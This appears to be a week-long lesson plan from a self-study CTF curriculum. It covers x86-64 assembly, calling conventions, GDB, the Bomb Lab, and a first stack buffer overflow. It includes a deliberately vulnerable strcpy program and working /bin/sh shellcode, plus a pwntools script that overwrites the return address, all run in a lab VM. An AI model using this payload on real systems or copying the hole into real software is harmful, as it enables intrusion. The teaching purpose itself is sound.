You’ve spent six weeks building the C foundation. Now you’ll step through the looking glass into the machine’s native language: **assembly**. This week you’ll stop imagining the stack and start *seeing* it. You’ll learn x86‑64 instructions, dissect function calls, and perform your first deliberate code injection. By the end, the Bomb Lab will be your proving ground.

# 🔥 WEEK 7: INTENSIVE DEEP DIVE  
## *“The Programmer’s Model”*

---

## ⏳ Session Overview (8‑Hour Immersive Block)

| Time (total) | Section |
|--------------|---------|
| 0:00 – 1:30 | x86‑64 Architecture & Basic Instructions |
| 1:30 – 3:30 | The Stack Frame – Calling Conventions |
| 3:30 – 4:30 | GDB Power‑Up: Assembly‑Level Debugging |
| 4:30 – 6:00 | Introduction to the Bomb Lab (or equivalent) |
| 6:00 – 6:30 | Simple Recursion in Assembly |
| 6:30 – 7:30 | First Exploit: Overwriting the Return Address |
| 7:30 – 8:00 | Problem Set Kickoff & Reflection |

---

## 🧠 PART 1: X86‑64 ARCHITECTURE & BASIC INSTRUCTIONS (1.5 HOURS)

Assembly is not a single language—it’s the human‑readable form of machine code, specific to each CPU family. We focus on **x86‑64** (also called AMD64), the architecture of most desktops and CTF binaries.

### 1.1 Registers – The CPU’s Working Memory
x86‑64 has 16 general‑purpose 64‑bit registers, but many have historical names for backwards compatibility. The first 8 are particularly important:

| 64‑bit | 32‑bit (low half) | Common Purpose |
|--------|--------------------|-----------------|
| `rax`  | `eax`              | Return value |
| `rbx`  | `ebx`              | Callee‑saved |
| `rcx`  | `ecx`              | 4th argument |
| `rdx`  | `edx`              | 3rd argument |
| `rsi`  | `esi`              | 2nd argument (source index) |
| `rdi`  | `edi`              | 1st argument (destination index) |
| `rbp`  | `ebp`              | Frame pointer (base) |
| `rsp`  | `esp`              | Stack pointer |
| `r8‑r15` | `r8d‑r15d`       | Additional arguments / general |

Additionally, `rip` is the **instruction pointer** (cannot be modified directly except by control‑flow instructions). The `rflags` register holds status flags like `ZF` (zero), `CF` (carry), `SF` (sign).

**Key for CTF:** Arguments to functions on x86‑64 Linux are passed in **registers** in order: `rdi, rsi, rdx, rcx, r8, r9`. Return value in `rax`. Knowing this lets you trace function calls in a disassembler.

### 1.2 Data Movement
```asm
mov rax, rbx        ; rax = rbx
mov eax, 0x1234     ; zeros upper 32 bits automatically
mov BYTE PTR [rax], 0x41   ; store a byte at address in rax
lea rax, [rbp-4]    ; load effective address (rbp-4) into rax, no memory access
push rax            ; decrement rsp by 8, store rax at [rsp]
pop rbx             ; load [rsp] into rbx, increment rsp by 8
```

**Exercise:** Without using a computer, predict the result:
```asm
mov rax, 10
push rax
pop rbx
add rbx, 5
mov rcx, rbx
```
After execution, `rbx=15, rcx=15`.

### 1.3 Arithmetic & Logic
```asm
add rax, rbx        ; rax += rbx
sub rsp, 0x20       ; rsp -= 32
inc rax
and rax, 0xFF       ; bitwise AND
xor rax, rax        ; set rax to 0 (common optimization)
cmp rax, rbx        ; compute rax - rbx, set flags, discard result
test rax, rax       ; compute AND, set flags (check if zero)
```

**Why `xor reg, reg`?** It’s shorter and faster than `mov reg, 0`. You’ll see it constantly.

### 1.4 Control Flow
```asm
jmp label           ; unconditional jump
je label            ; jump if equal (ZF=1)
jne label           ; jump if not equal (ZF=0)
jg label            ; jump if greater (signed)
call printf         ; push rip, jmp to printf
ret                 ; pop rip
```

**Exercise:** Translate this C into assembly mentally:
```c
if (x == 0) {
    y = 1;
} else {
    y = 2;
}
```
x86‑64 version (assuming `x` in `rax`, `y` in `rbx`):
```asm
    test rax, rax
    jz .Lzero
    mov rbx, 2
    jmp .Lend
.Lzero:
    mov rbx, 1
.Lend:
```

### 1.5 Accessing Memory
Addressing modes: `[base + index*scale + offset]` where scale is 1,2,4,8.
```asm
mov rax, [rbx]            ; rax = *(rbx)
mov rax, [rbp - 8]        ; local variable
mov rax, [rsi + rcx*4]    ; array indexing
```

**Live demo:** Write a trivial C program, compile with `gcc -S -masm=intel program.c` and study the output. Identify `push rbp; mov rbp, rsp; sub rsp, N; ... leave; ret` pattern.

---

## 🧱 PART 2: THE STACK FRAME – CALLING CONVENTIONS (2 HOURS)

The stack is the heart of program execution flow. Mastering the stack layout is the key to understanding buffer overflows.

### 2.1 The Stack Grows Downward
- `rsp` points to the **lowest** valid address (top of stack).
- `push` decrements `rsp` then writes; `pop` reads then increments.
- The stack contains: return addresses, saved frame pointers, local variables, spilled registers.

### 2.2 Function Prologue and Epilogue
Every function that uses the stack typically begins and ends with standard sequences:
**Prologue:**
```asm
push rbp            ; save caller's frame pointer
mov rbp, rsp        ; set new frame pointer to current stack top
sub rsp, 0x20       ; allocate space for locals (e.g., 32 bytes)
```
**Epilogue:**
```asm
leave               ; mov rsp, rbp; pop rbp (restore old rbp and rsp)
ret                 ; pop rip (return to caller)
```

**Why this matters:** The saved `rbp` and return address are adjacent. A buffer starts at `rbp - offset`. If you write beyond the buffer, you can overwrite the saved `rbp` and then the return address.

### 2.3 Stack Frame Diagram (Draw This)
```
       High addresses
       +------------------+
       | ... caller's data |
       +------------------+
       | return address    |   <- rbp + 8
       +------------------+
       | saved rbp         |   <- rbp (points here after prologue)
       +------------------+
       | local variable 1  |   <- rbp - 4
       +------------------+
       | buffer[7]         |
       | ...               |
       | buffer[0]         |   <- rbp - 8 - ... (or rsp)
       +------------------+   <- rsp
       Low addresses
```

### 2.4 Tracing a Simple Function
```c
int add(int a, int b) {
    int result = a + b;
    return result;
}
```
Compiled ( -O0 ) might produce:
```asm
add:
    push rbp
    mov rbp, rsp
    mov DWORD PTR [rbp-20], edi   ; a
    mov DWORD PTR [rbp-24], esi   ; b
    mov edx, DWORD PTR [rbp-20]
    mov eax, DWORD PTR [rbp-24]
    add eax, edx
    mov DWORD PTR [rbp-4], eax    ; result
    mov eax, DWORD PTR [rbp-4]
    pop rbp
    ret
```
**Exercise:** Trace the instructions, noting where arguments arrive (edi, esi). At `-O2`, the function might just be `lea eax, [rdi+rsi]; ret` — no stack use at all.

### 2.5 Buffer Overflow Visualization (Live Code)
Write a vulnerable program:
```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *str) {
    char buffer[16];
    strcpy(buffer, str);
}

int main(int argc, char *argv[]) {
    if (argc > 1)
        vulnerable(argv[1]);
    return 0;
}
```
Compile with `gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c -g`.

Run with increasing input lengths:
- `./vuln AAAAAAAAAAAAAAA` (15 A's) — fine.
- `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` — segmentation fault.

**GDB time:**
```
gdb ./vuln
(gdb) run $(python3 -c "print('A'*40)")
```
When it crashes, `info registers` shows `rip` overwritten with `0x4141414141414141`. You’ve hijacked control flow.

**Find exact offset:** Use `pwntools` cyclic:
```bash
cyclic 50
```
Copy the output, run in GDB, check `rip` value, then `cyclic -l <value>` gives the offset. This is your first exploit primitive.

---

## 🔬 PART 3: GDB POWER‑UP – ASSEMBLY‑LEVEL DEBUGGING (1 HOUR)

You’ve used GDB for C‑level debugging. Now we go bare metal.

### 3.1 Key Commands for Assembly
```gdb
layout asm           ; TUI assembly view
layout regs          ; show registers (if using GEF/pwndbg)
disassemble main     ; show disassembly of main
x/5i $rip            ; examine 5 instructions at rip
x/10gx $rsp          ; examine 10 giant (8‑byte) words in hex at stack
x/s $rdi             ; print string pointed to by rdi
info registers       ; show all registers
print $rax           ; print rax value (GDB uses $ for registers)
set $rax = 0xdead    ; change a register!
stepi (si)           ; step one instruction (into call)
nexti (ni)           ; next instruction (over call)
```

### 3.2 Setting Conditional Breakpoints
`break *main+42 if $rdi == 0x1234` — break only when condition true. Useful when you know the exploit triggers only with certain data.

### 3.3 Watchpoints
`watch *(int*)0x7fff1234` — break when that memory location changes. Fantastic for finding what modifies a variable.

### 3.4 Scripting GDB
Source a gdb script with `source script.gdb`. You can define custom commands:
```
define hook-stop
  printf "RSP: %p, RIP: %p\n", $rsp, $rip
end
```
This runs on every breakpoint. Full Python GDB API later, but know this exists.

**Exercise:** Load your vulnerable binary, set a breakpoint after `strcpy`, run, then examine the buffer. Show the overwritten return address. Change `rip` manually to skip a crash (for fun).

---

## 💣 PART 4: INTRODUCTION TO THE BOMB LAB (1.5 HOURS)

The CMU Bomb Lab is a legendary binary reverse engineering exercise. You are given a binary (`bomb`) with multiple “phases.” Each phase requires you to input a specific string. If you’re wrong, the bomb “explodes” (calls `explode_bomb`). Your job is to defuse each phase by understanding the assembly.

**Access:** If you’re officially enrolled in CMU’s 15‑213, you’ll get it. Otherwise, you can find similar binaries in the picoCTF “Bomb Lab” challenge or use the self‑study version floating around (searching for “bomb lab self study” yields a downloadable version). We’ll assume you have a `bomb` binary.

### 4.1 Phase 1: String Comparison
**Goal:** Find the exact string that phase_1 compares your input against.

**Approach:**
1. Run `objdump -d bomb > bomb.asm` to get the disassembly.
2. Find `phase_1`: it usually does `mov esi, 0x... ; call strings_not_equal`. The argument in `esi` is an address.
3. Use `gdb bomb`, `break phase_1`, `run`, and when it breaks, `x/s $esi` (or `x/s address`). That prints the hidden string.

**Demo (simplified):**
```bash
(gdb) break phase_1
(gdb) run
Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up.
Have a nice day!
> hello
Breakpoint 1, 0x400ee0 in phase_1
(gdb) x/s $esi   # or the register used for the address
0x402400: "I am just a renegade hockey mom."
```
Input that string, and phase 1 is defused.

**Why this matters:** You just performed static analysis (with `objdump`) and dynamic analysis (with GDB) to reverse a simple task. This is the core skill for cracking, patching, and exploiting.

### 4.2 Generic Approach to Any Phase
- Identify the input function (maybe `read_line`), see where input is stored.
- Look for `call explode_bomb` and work backwards to find the condition.
- Phase 2 might be a loop over numbers, phase 3 a switch statement, etc.

**In‑session task:** Defuse phase 1 of your bomb (or, if no bomb, use the picoCTF “Bomb Lab” practice or the “Open Security Training” bomb exercise). Write a detailed step‑by‑step in your notes.

---

## 🔁 PART 5: SIMPLE RECURSION IN ASSEMBLY (0.5 HOUR)

Recursion is just function calls, but watching it in assembly solidifies stack frame creation and destruction.

**Example:** Recursive factorial in C, then its asm.
```c
int fact(int n) {
    if (n <= 1) return 1;
    return n * fact(n-1);
}
```
Corresponding assembly (conceptual):
```asm
fact:
    push rbp
    mov rbp, rsp
    sub rsp, 16
    mov [rbp-4], edi     ; save n
    cmp edi, 1
    jg .recurse
    mov eax, 1
    leave
    ret
.recurse:
    mov edi, [rbp-4]
    sub edi, 1
    call fact
    mov edx, [rbp-4]
    imul eax, edx
    leave
    ret
```
Set a breakpoint at `call fact` and watch the stack grow. Each call pushes a new return address and saved rbp. When base case hits, `ret` unwinds them.

**CTF angle:** Return‑oriented programming (ROP) chains are essentially forced recursive returns without the matching calls. Understanding recursion helps you think in terms of stack unwinding.

---

## 💥 PART 6: FIRST EXPLOIT – OVERWRITING THE RETURN ADDRESS (1 HOUR)

Now, using the vulnerable program from Part 2, you’ll execute **code injection**.

### 6.1 Shellcode
We’ll use a small shellcode that executes `execve("/bin/sh", NULL, NULL)`. You can find standard x86‑64 shellcode online (approx 27 bytes). For ethical reasons, I’ll give a common shellcode in hex:

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```
(This is a standard `execve("/bin/sh")`; it clears rax, pushes the string `/bin//sh`, and executes syscall 0x3b.)

### 6.2 Crafting the Payload
Layout: [ NOP sled ] [ shellcode ] [ padding ] [ return address pointing to buffer ]

**Steps:**
1. Find offset to return address (cyclic).
2. Find address of buffer. Since ASLR off (`-no-pie`), buffer address is roughly constant. You can find it with GDB: `p &buffer` in `vulnerable`.
3. Construct payload with pwntools:
```python
from pwn import *

# Shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# Offset from start of buffer to return address
offset = 24  # example, use cyclic to find
ret_addr = 0x7fffffffe000  # example buffer address, you'll adjust

payload = b"\x90" * 16 + shellcode   # NOP sled + shellcode
payload += b"A" * (offset - len(payload))  # padding
payload += p64(ret_addr)

# Write payload to file or send directly
with open('payload', 'wb') as f:
    f.write(payload)
```
Then run `./vuln $(cat payload)`. If everything lines up, you’ll get a shell.

**In‑session demo:** Try this on your VM with ASLR disabled (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`). You might need to adjust addresses. Use GDB to examine where the shellcode lands and set `ret_addr` accordingly. This is your first binary exploitation victory.

**Why this matters:** This is the “hello world” of pwn. From here, you’ll learn to bypass ASLR, stack canaries, NX, and more.

---

## 📝 WEEK 7 PROBLEM SET (Daily 2‑4 Hours)

### PS7‑1: CS:APP Chapter 3 (Machine‑Level Representation of Programs)
Read sections 3.1 – 3.7 (up to “Procedures”). Do practice problems 3.1 through 3.10. These involve reading small assembly snippets and answering register/memory values. Use your GDB to verify.

### PS7‑2: Bomb Lab Phase 1 (and phase 2 if possible)
Defuse phase 1 completely on your own, documenting every step. Try to work out phase 2 (often a simple loop that expects a specific sequence of numbers). Use GDB to step through the loop and see what it expects. Write a full write‑up like a CTF solution.

### PS7‑3: CS50 Week 3 – Plurality or Runoff (C)
Complete the “Plurality” problem (or “Runoff”) from CS50 to practice more C data structures and logic. Use arrays, structs, and strings. This keeps your C sharp while assembly fills your brain.

### PS7‑4: pwn.college – Hello World and Babyfirst Overflow
Go to [pwn.college](https://pwn.college) and complete the following levels in the “Program Interaction” and “Memory Corruption” modules:
- **Hello World:** echo a specific value.
- **babyfirst_overflow:** a very simple buffer overflow. Use pwntools to solve it and capture the flag.
These are designed to teach you the pwntools workflow.

### PS7‑5: Write Your First pwntools Exploit Template
Create a file `exploit_template.py`:
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
# context.binary = elf
# context.log_level = 'debug'

p = process('./vuln')   # or remote('host', port)
payload = b''
# build payload
p.sendline(payload)
p.interactive()
```
Use it to test the overflow from Part 6.

### PS7‑6: OverTheWire Narnia (Start)
Move to Narnia wargame (SSH to narnia.labs.overthewire.org). Levels 0 and 1 are basic buffer overflows. Apply your new skills to solve level 0. (You’ll need to log in with password from bandit’s end; Narnia is accessible if you’ve done Bandit. If not, start Narnia 0 on its own credentials from the website.)

### PS7‑7: Read “x86 Assembly Guide”
Use the University of Virginia CS216 guide (or any good x86‑64 reference) as your quick reference throughout the week. Bookmark it.

### PS7‑8: Reflection
In `week7_reflection.md`:
1. What was your “aha!” moment when looking at assembly?
2. Describe how you found the return address offset and why it’s important.
3. Did you get a shell? If not, what went wrong? (Address misalignment? ASLR on?)
4. How has your understanding of C pointers changed after seeing them in assembly?

---

## 🔥 DEEP DIVE WRAP‑UP

You’ve crossed the most critical threshold of this journey. Assembly is no longer a foreign language; it’s the raw truth of your C programs. You’ve seen the stack, you’ve touched the return address, and you’ve possibly even popped a shell. The Bomb Lab taught you to reverse engineer; the overflow taught you to break; and the debugger taught you the path forward.

Next week, you’ll go deeper into the heap, format strings, and the beginnings of real exploit development. Every single CTF binary challenge will now look different to you: not opaque, but a sequence of instructions waiting to be read.

**Open your VM. Fire up GDB. Feed it that long string of A’s. Own the machine.**
